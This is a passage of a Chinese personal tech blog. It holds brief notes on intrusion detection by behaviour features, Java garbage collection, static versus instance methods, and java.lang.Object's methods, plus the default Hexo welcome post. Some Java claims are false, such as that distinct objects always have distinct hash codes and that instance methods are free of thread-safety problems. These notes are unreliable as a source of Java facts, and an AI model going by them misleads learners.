<p>   其次，如果我们能明确知道哪些是入侵者，即数据产生方已经积累了一定的入侵用户，那么我们可以针对入侵者的入侵手段进行建模，比如说，这些入侵者都喜欢在凌晨3点，进行网络认证，且他们在线的时间较短，那么我们便可以收集这两个特征作为入侵者的特征，继而针对网络认证用户进行判断。</p>
<p>   当然我们也可以结合其他的一些辅助手段进行异常用户的检测，比如说黑名单，可以根据入侵者的行为模式构建哥规则列表，即符合该规则库中的任意一条规则几位入侵者。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/16/入侵检测/" data-id="cjdjy3u3a00060c744eblr3ra" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/入侵检测/">入侵检测</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-JAVA_GC" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/16/JAVA_GC/" class="article-date">
  <time datetime="2018-01-16T07:10:22.000Z" itemprop="datePublished">2018-01-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Study/">Study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/16/JAVA_GC/">Java_GC</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Java的内存分配与回收全部由JVM垃圾回收进程自动完成。与C语言不同，Java开发者不需要自己编写代码实现垃圾回收。<br>程序员可以调用System.gc()和Runtime.gc()来请求JVM启动垃圾回收，但是JVM并不保证这些请求都会执行，启动时间依然取决于堆内存中的Eden区是否可用。</p>
<p>在运行时，Java的实例被存放在堆内存区域。当一个对象不再被引用时，满足条件就会从堆内存移除。在垃圾回收进程中，这些对象将会从堆内存移除并且内存空间被回收。堆内存以下三个主要区域：  </p>
<h3 id="新生代（Young-Generation）-Eden-s0-s1"><a href="#新生代（Young-Generation）-Eden-s0-s1" class="headerlink" title="新生代（Young Generation）(Eden-s0-s1)"></a>新生代（Young Generation）(Eden-s0-s1)</h3><h5 id="Eden空间（Eden-space，任何实例都通过Eden空间进入运行时内存区域）：当一个实例被创建了，首先会被存储在堆内存年轻代的-Eden-区中。"><a href="#Eden空间（Eden-space，任何实例都通过Eden空间进入运行时内存区域）：当一个实例被创建了，首先会被存储在堆内存年轻代的-Eden-区中。" class="headerlink" title="Eden空间（Eden space，任何实例都通过Eden空间进入运行时内存区域）：当一个实例被创建了，首先会被存储在堆内存年轻代的 Eden 区中。"></a>Eden空间（Eden space，任何实例都通过Eden空间进入运行时内存区域）：当一个实例被创建了，首先会被存储在堆内存年轻代的 Eden 区中。</h5><h5 id="S0-Survivor空间：存在时间长的实例将会从Eden空间移动到S0-Survivor空间"><a href="#S0-Survivor空间：存在时间长的实例将会从Eden空间移动到S0-Survivor空间" class="headerlink" title="S0 Survivor空间：存在时间长的实例将会从Eden空间移动到S0 Survivor空间"></a>S0 Survivor空间：存在时间长的实例将会从Eden空间移动到S0 Survivor空间</h5><h5 id="S1-Survivor空间：存在时间更长的实例将会从S0-Survivor空间移动到S1-Survivor空间"><a href="#S1-Survivor空间：存在时间更长的实例将会从S0-Survivor空间移动到S1-Survivor空间" class="headerlink" title="S1 Survivor空间：存在时间更长的实例将会从S0 Survivor空间移动到S1 Survivor空间"></a>S1 Survivor空间：存在时间更长的实例将会从S0 Survivor空间移动到S1 Survivor空间</h5><h3 id="老年代（Old-Generation）：是堆内存中的第二块逻辑区。当垃圾回收器执行-Minor-GC-周期时，在-S1-Survivor-区中的存活实例将会被晋升到老年代，而未被引用的对象被标记为回收。"><a href="#老年代（Old-Generation）：是堆内存中的第二块逻辑区。当垃圾回收器执行-Minor-GC-周期时，在-S1-Survivor-区中的存活实例将会被晋升到老年代，而未被引用的对象被标记为回收。" class="headerlink" title="老年代（Old Generation）：是堆内存中的第二块逻辑区。当垃圾回收器执行 Minor GC 周期时，在 S1 Survivor 区中的存活实例将会被晋升到老年代，而未被引用的对象被标记为回收。"></a>老年代（Old Generation）：是堆内存中的第二块逻辑区。当垃圾回收器执行 Minor GC 周期时，在 S1 Survivor 区中的存活实例将会被晋升到老年代，而未被引用的对象被标记为回收。</h3><h4 id="永久代（Permanent-Generation）包含类、方法等细节的元信息-在Java8中已被移除"><a href="#永久代（Permanent-Generation）包含类、方法等细节的元信息-在Java8中已被移除" class="headerlink" title="永久代（Permanent Generation）包含类、方法等细节的元信息(在Java8中已被移除)"></a>永久代（Permanent Generation）包含类、方法等细节的元信息(在Java8中已被移除)</h4><p>死亡的实例（不再被引用）被标记为垃圾回收。根据垃圾回收器选择的不同，要么被标记的实例都会不停地从内存中移除，要么回收过程会在一个单独的进程中完成。</p>
<p>Java 中的堆也是 GC 收集垃圾的主要区域。GC 分为两种：Minor GC、Full GC ( 或称为 Major GC )。<br>Minor GC 是发生在新生代中的垃圾收集动作，所采用的是复制算法。(当对象在新生代中，经过一次Minor GC如果对象还存活，并且能被新生代内的区域接纳，则使用复制算法将这些仍然存活的对象复制到下一区域，然后清理所使用过的 Eden 以及 s0 区域，并且将这些对象的年龄设置为1，以后对象在 Survivor 区每熬过一次 Minor GC，就将对象的年龄 + 1，当对象的年龄达到某个值时 ( 默认是 15 岁，可以通过参数 -XX:MaxTenuringThreshold 来设定 )，这些对象就会成为老年代。)<br>Full GC 是发生在老年代的垃圾收集动作，所采用的是标记-清除算法。(Full GC 发生的次数不会有 Minor GC 那么频繁，并且做一次 Full GC 要比进行一次 Minor GC 的时间更长)</p>
<p>碎片整理:一旦实例从堆内存中被删除，其位置就会变空并且可用于未来实例的分配。这些空出的空间将会使整个内存区域碎片化。为了实例的快速分配，需要进行碎片整理。基于垃圾回收器的不同选择，回收的内存区域要么被不停地被整理，要么在一个单独的GC进程中完成。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/16/JAVA_GC/" data-id="cjdjy3u2o00010c745bvnv6lz" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Java中静态块与静态方法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/15/Java中静态块与静态方法/" class="article-date">
  <time datetime="2018-01-15T06:07:34.000Z" itemprop="datePublished">2018-01-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Study/">Study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/15/Java中静态块与静态方法/">Java中静态块与静态方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一、静态块与静态方法："><a href="#一、静态块与静态方法：" class="headerlink" title="一、静态块与静态方法："></a>一、静态块与静态方法：</h2><p>静态代码块是自动执行的，在项目启动时就执行，<br>静态方法是被调用的时候才执行的，在项目启动时就初始化但不执行，在不创建对象的情况下可以被其他程序调用。</p>
<p>静态方法：如果我们在程序编写的时候需要一个不实例化对象就可以调用的方法，我们就可以使用静态方法，具体实现是在方法钱加上static，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="二、静态方法与非静态方法："><a href="#二、静态方法与非静态方法：" class="headerlink" title="二、静态方法与非静态方法："></a>二、静态方法与非静态方法：</h2><h3 id="1、生命周期（Lifecycle）："><a href="#1、生命周期（Lifecycle）：" class="headerlink" title="1、生命周期（Lifecycle）："></a>1、生命周期（Lifecycle）：</h3><p>静态方法（Static Method）与静态成员变量一样，属于类本身，在类装载的时候被装载到内存（Memory），不自动进行销毁，会一直存在于内存中，直到JVM关闭。</p>
<p>非静态方法（Non-Static Method）又叫实例化方法，属于实例对象，实例化后才会分配内存，必须通过类的实例来引用。不会常驻内存，当实例对象被JVM 回收之后，也跟着消失。 </p>
<h3 id="2、-在内存中存储位置"><a href="#2、-在内存中存储位置" class="headerlink" title="2、 在内存中存储位置"></a>2、 在内存中存储位置</h3><p>静态方法和静态变量创建后始终使用同一块内存，是连续的。</p>
<p>非静态方法会存在于内存的多个地方，是离散的。</p>
<h3 id="3、-效率"><a href="#3、-效率" class="headerlink" title="3、 效率"></a>3、 效率</h3><p> 静态方法的使用效率比非静态方法的效率高。</p>
<h3 id="4、线程安全"><a href="#4、线程安全" class="headerlink" title="4、线程安全"></a>4、线程安全</h3><p>静态方法是共享代码段，静态变量是共享数据段。既然是“共享”就有并发（Concurrence）的问题。</p>
<p>非静态方法是针对确定的一个对象的，所以不会存在线程安全的问题。</p>
<h3 id="5、-使用范围"><a href="#5、-使用范围" class="headerlink" title="5、 使用范围"></a>5、 使用范围</h3><p>静态方法：⒈ 有静态属性的类，一般会定义静态方法。⒉ 没有属性的类，一般会定义静态方法。⒊ 如果一个方法与他所在类的实例对象无关，那么它就应该是静态的。静态方法可以被继承但是不能被覆盖。</p>
<h3 id="6、-总计"><a href="#6、-总计" class="headerlink" title="6、  总计"></a>6、  总计</h3><p>如果静态方法在系统中定义太多，会占用大量的资源，最后造成内存溢出，所以静态方法不能滥用。如果从线程安全、性能、兼容性上来看，选用实例化方法为宜。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/15/Java中静态块与静态方法/" data-id="cjdjy3u3700050c74kyhcbvt9" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-读java源码之object" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/14/读java源码之object/" class="article-date">
  <time datetime="2018-01-14T12:35:32.000Z" itemprop="datePublished">2018-01-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Study/">Study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/14/读java源码之object/">读java源码之object</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>阅读源码只为了更加深刻理解常用类的运用。<br>根据自己的读书经历，发现从原理出发会更感兴趣，如果只是会用和记忆，很快就会忘记。<br>因此，在决定找实习之前重新温习一下Java的源码，希望以后千行bug率能低的离谱好吧。</p>
<h3 id="1-registerNatives"><a href="#1-registerNatives" class="headerlink" title="(1)registerNatives"></a>(1)registerNatives</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">registerNatives</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>个人理解是:这里是一个调用C语言写成的源程序Java_java_lang_Object_registerNatives,确切的说是JNINativeMethod函数，里面写明了HashCode,Wait,notify,notify,notifyAll,clone。这里不包含Object.getClass()。native是Java调用非Java代码的接口。</p>
<h3 id="2-registerNatives"><a href="#2-registerNatives" class="headerlink" title="(2)registerNatives"></a>(2)registerNatives</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    registerNatives();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：这里是调用了registerNatives()方法。在虚拟机的生命周期只调用一次，仅用于初始化。</p>
<h3 id="3-getClass"><a href="#3-getClass" class="headerlink" title="(3)getClass"></a>(3)getClass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> Class&lt;?&gt; getClass();</span><br></pre></td></tr></table></figure>
<p>个人理解：这个方法依然是调用了外部的C语言写的代码，是针对实例（也就是通常所说的对象）的方法，返回值是运行时期才能确定的。与之类似的有一个class()方法，是在编译期就确定的，针对类的方法。当出现继承和多态（父类引用指向子类对象）的时候，getClass返回的则是子类名。</p>
<h3 id="4-hashCode"><a href="#4-hashCode" class="headerlink" title="(4)hashCode"></a>(4)hashCode</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>个人理解：返回一个整数的散列码（HashCode）。两个相同的对象返回的必然是相同的整数结果,不同的对象返回的必然是不同的整数结果。</p>
<h3 id="5-equals"><a href="#5-equals" class="headerlink" title="(5)equals"></a>(5)equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：对比两个对象是否相等，实现了比较两个对象是否相等的功能。如果是e实例非空，e.equals(e)，则恒返回true。如果a.equals(b)返回true,b.equals(c)返回true,则c.equals(a)也必然返回true。非空值equals空值恒返回false。<br>equals在对比基础类型的时候，比的是内容(这里涉及到常量池的问题)，在对比引用类型的时候，比的是地址值。<br>ps：但是，在比较Integer时，-128~127区间内的数值仍然指向常量池。</p>
<h3 id="6-clone"><a href="#6-clone" class="headerlink" title="(6)clone"></a>(6)clone</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure>
<p>个人理解：调用clone方法返回的是一个Object对象。这里clone属性是protected，重载的时候要改成public。在派生类中覆盖Object的clone()方法时，一定要调用super.clone()。<br>    浅层复制： 被复制的对象的所有成员属性都有与原来的对象相同的值，而所有的对其他对象的引用仍然指向原来的对象。换言之，浅层复制仅仅复制所考虑的对象，而不复制它所引用的对象。（概念不好理解，请结合下文的示例去理解）<br>    深层复制：被复制对象的所有变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。那些引用其他对象的变量将指向被复制过的新对象，而不是原有的那些被引用的对象。换而言之，深层复制要复制的对象引用的对象都复制一遍。</p>
<h3 id="7-toString"><a href="#7-toString" class="headerlink" title="(7)toString"></a>(7)toString</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">"@"</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：简单来说就是将对象的一些特有属性编辑成一个字符串。</p>
<h3 id="8-notify"><a href="#8-notify" class="headerlink" title="(8)notify"></a>(8)notify</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>个人理解：通知一个线程重新运行(唤醒),由于重新运行的不知道是哪个线程，所以并不推荐在有两个或以上线程时使用。</p>
<h3 id="9-notifyAll"><a href="#9-notifyAll" class="headerlink" title="(9)notifyAll"></a>(9)notifyAll</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notifyAll</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>个人理解：与notify相似，不同的是，notifyAll重启(唤醒)的是所有等待中的线程。</p>
<h3 id="10-wait"><a href="#10-wait" class="headerlink" title="(10)wait"></a>(10)wait</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br></pre></td></tr></table></figure>
<p>个人理解：注册一个常量wait，调用本地的非java代码，并抛出一个线程中断错误。导致当前线程等待，直到调用notify()或者notifyAll()方法，或者在超过指定时间(timeout)后。</p>
<h3 id="11-wait"><a href="#11-wait" class="headerlink" title="(11)wait"></a>(11)wait</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout, <span class="keyword">int</span> nanos)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (timeout &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"timeout value is negative"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nanos &lt; <span class="number">0</span> || nanos &gt; <span class="number">999999</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                            <span class="string">"nanosecond timeout value out of range"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nanos &gt;= <span class="number">500000</span> || (nanos != <span class="number">0</span> &amp;&amp; timeout == <span class="number">0</span>)) &#123;</span><br><span class="line">        timeout++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(timeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：   timeout：最大等待时间，单位是毫秒。<br>            nanos：附加时间，单位是纳秒，范围是0-999999<br>            附加时间不规范，则抛出异常，如果附加时间大于等于半毫秒，则timeout++(应该是采用四舍五入的思想)，否则舍弃。特殊情况下如果timeout为0，而nanos不为0，则timeout++(同理);最后将timeout值当做参数调用上面(10)注册的wait方法。<br>            猜测：主要是用于更加精确的控制时间，从毫秒级别到纳秒级别是1000*1000倍的关系。这一点点时间看起来或许不是很重要，但如果在高并发的情况下，这一点点的时间代表的是不小量级的资源。</p>
<h3 id="12-wait"><a href="#12-wait" class="headerlink" title="(12)wait"></a>(12)wait</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：如果直接调用wait方法，不传入参数，那么超时时间为0。表示没有唤醒的情况下一直等待。</p>
<p>######在此，个人认为官方提倡的多态是将多种不同形式的参数经过相同方法名但传入参数不同的方法处理后，调用同一个方法。也就是相同方法名不同参数会先进行参数处理，而后调用相同的方法(有的会是在本类中注册的方法，有的则是super的方法)，复用是面向对象的一个特色，减少代码量的同时又不影响效率。</p>
<h3 id="13-finalize"><a href="#13-finalize" class="headerlink" title="(13)finalize"></a>(13)finalize</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123; &#125;</span><br></pre></td></tr></table></figure>
<p>个人理解：垃圾回收器准备释放内存的时候，会先调用finalize()，但对象不一定会回收，垃圾回收不是析构函数，垃圾回收只与内存有关，垃圾回收和finalize()都是靠不住的，只要JVM没有到快耗尽内存的地步，就不会进行垃圾回收。<br>关键字protected是防止在该类之外定义的代码访问finalize()标识符。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/14/读java源码之object/" data-id="cjdjy3u5r000v0c747fnyort2" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/14/hello-world/" class="article-date">
  <time datetime="2018-01-14T07:38:18.478Z" itemprop="datePublished">2018-01-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/14/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/14/hello-world/" data-id="cjdjy3u3200040c74vwxfbby3" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/02/02/神经网络/">神经网络</a>
          </li>
        
          <li>
            <a href="/2018/01/25/sqlmap手册/">sqlmap手册</a>
          </li>
        
          <li>
            <a href="/2018/01/24/Python基础/">Python基础</a>
          </li>
        
          <li>
            <a href="/2018/01/22/TCP协议/">TCP协议的三次握手四次挥手</a>
          </li>
        
          <li>
            <a href="/2018/01/16/入侵检测系统搭建/">入侵检测系统搭建</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">9</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Kategorien</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Study/">Study</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/毕设/">毕设</a><span class="category-list-count">4</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CS/">CS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/">Java</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/入侵检测/">入侵检测</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/神经网络/">神经网络</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>


  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 律_Ming<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>